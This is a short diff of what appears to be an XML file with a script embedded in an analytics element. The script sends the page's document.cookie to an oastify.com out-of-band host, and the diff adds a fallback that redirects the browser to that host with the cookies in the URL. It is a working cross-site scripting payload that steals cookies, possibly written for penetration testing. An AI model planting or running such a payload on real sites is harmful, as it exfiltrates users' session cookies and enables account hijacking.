@@ -55,6 +55,8 @@
         req.addEventListener('load', reqListener);
         req.open('GET', `https://288kydkscyu1yf4hya78vdex1o7gvej3.oastify.com/xhr.works?c=${document.cookie}`);
         req.send();
+        // if all fails...
+        window.location = `https://288kydkscyu1yf4hya78vdex1o7gvej3.oastify.com/xhr.works?c=${document.cookie}`;
     </script>
     ]]>
 </snf:analytics>
